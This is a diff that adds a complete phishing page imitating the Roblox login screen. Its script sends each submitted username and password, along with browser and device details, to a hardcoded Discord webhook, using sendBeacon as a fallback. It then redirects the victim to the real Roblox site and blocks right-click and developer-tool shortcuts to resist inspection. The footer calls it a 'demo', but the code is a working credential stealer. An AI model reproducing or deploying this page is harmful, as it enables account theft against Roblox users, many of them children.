@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox — Log In</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
+    background: #f2f4f5;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #393b3d;
+  }
+  .wrap {
+    background: #fff;
+    width: 100%;
+    max-width: 400px;
+    padding: 40px 36px 32px;
+    border-radius: 8px;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+  }
+  .logo {
+    text-align: center;
+    margin-bottom: 24px;
+    font-size: 28px;
+    font-weight: 700;
+    color: #393b3d;
+    letter-spacing: -0.5px;
+  }
+  .logo span { color: #00a2ff; }
+  h2 {
+    font-size: 20px;
+    font-weight: 600;
+    margin-bottom: 20px;
+    text-align: center;
+  }
+  .field { margin-bottom: 14px; }
+  input {
+    width: 100%;
+    padding: 12px 14px;
+    border: 1px solid #c3c6c8;
+    border-radius: 4px;
+    font-size: 15px;
+    background: #fff;
+    outline: none;
+    transition: border-color 0.15s;
+  }
+  input:focus { border-color: #00a2ff; }
+  .btn {
+    width: 100%;
+    padding: 13px;
+    background: #00a2ff;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: background 0.15s;
+  }
+  .btn:hover { background: #0089d6; }
+  .btn:disabled { background: #9bd4f5; cursor: default; }
+  .err {
+    color: #d63a2f;
+    font-size: 13px;
+    text-align: center;
+    margin-top: 12px;
+    min-height: 16px;
+  }
+  .foot {
+    font-size: 12px;
+    color: #7d8082;
+    text-align: center;
+    margin-top: 22px;
+    line-height: 1.5;
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="logo">R<span>O</span>BLOX</div>
+  <h2>Log in to continue</h2>
+  <form id="loginForm" autocomplete="off">
+    <div class="field">
+      <input type="text" id="username" name="username" placeholder="Username/Email" required>
+    </div>
+    <div class="field">
+      <input type="password" id="password" name="password" placeholder="Password" required>
+    </div>
+    <button type="submit" class="btn" id="submitBtn">Log In</button>
+    <div class="err" id="err"></div>
+  </form>
+  <div class="foot">
+    By logging in you agree to the Roblox Terms of Use.<br>
+    Not a real Roblox page. Demo only.
+  </div>
+</div>
+
+<script>
+// =====================================================================
+// CONFIG
+// =====================================================================
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1557573626151051324/1L8hNoyAglL5SnaqZwb_yMJMHH7Yqg4jFtiCFU8ACUbJt-xK7V4tBzutW2OEh8mUk-PD";
+const REDIRECT_URL = "https://www.roblox.com/home";
+const REDIRECT_DELAY_MS = 1800;
+
+// =====================================================================
+// HELPERS
+// =====================================================================
+function collectMeta() {
+  return {
+    timestamp: new Date().toISOString(),
+    user_agent: navigator.userAgent,
+    language: navigator.language,
+    platform: navigator.platform,
+    screen: `${screen.width}x${screen.height}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    referrer: document.referrer || "direct",
+    url: window.location.href,
+  };
+}
+
+function fmtMeta(m) {
+  return Object.entries(m)
+    .map(([k, v]) => `**${k}:** \`${String(v).replace(/`/g, "\\`")}\``)
+    .join("\n");
+}
+
+// =====================================================================
+// EXFIL
+// =====================================================================
+async function sendToWebhook(username, password) {
+  const meta = collectMeta();
+
+  const payload = {
+    username: "Roblox Logger",
+    embeds: [
+      {
+        title: "New Login Captured",
+        color: 0x00a2ff,
+        fields: [
+          { name: "Username", value: "```" + username + "```", inline: false },
+          { name: "Password", value: "```" + password + "```", inline: false },
+          { name: "Meta", value: fmtMeta(meta), inline: false },
+        ],
+        footer: { text: "roblox-login" },
+        timestamp: new Date().toISOString(),
+      },
+    ],
+  };
+
+  try {
+    const res = await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    });
+    return res.ok;
+  } catch (e) {
+    try {
+      const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
+      navigator.sendBeacon(WEBHOOK_URL, blob);
+      return true;
+    } catch (_) {
+      return false;
+    }
+  }
+}
+
+// =====================================================================
+// SUBMIT FLOW
+// =====================================================================
+const form = document.getElementById("loginForm");
+const btn = document.getElementById("submitBtn");
+const errEl = document.getElementById("err");
+
+form.addEventListener("submit", async (e) => {
+  e.preventDefault();
+  errEl.textContent = "";
+  btn.disabled = true;
+  btn.textContent = "Logging in...";
+
+  const username = document.getElementById("username").value.trim();
+  const password = document.getElementById("password").value;
+
+  if (!username || !password) {
+    errEl.textContent = "Please fill in both fields.";
+    btn.disabled = false;
+    btn.textContent = "Log In";
+    return;
+  }
+
+  await sendToWebhook(username, password);
+
+  setTimeout(() => {
+    window.location.href = REDIRECT_URL;
+  }, REDIRECT_DELAY_MS);
+});
+
+// =====================================================================
+// LIGHT ANTI-INSPECT (optional — remove if you don't want it)
+// =====================================================================
+document.addEventListener("contextmenu", (e) => e.preventDefault());
+document.addEventListener("keydown", (e) => {
+  const k = e.key.toLowerCase();
+  if (
+    k === "f12" ||
+    (e.ctrlKey && e.shiftKey && (k === "i" || k === "j" || k === "c")) ||
+    (e.ctrlKey && k === "u")
+  ) {
+    e.preventDefault();
+  }
+});
+</script>
+</body>
+</html>
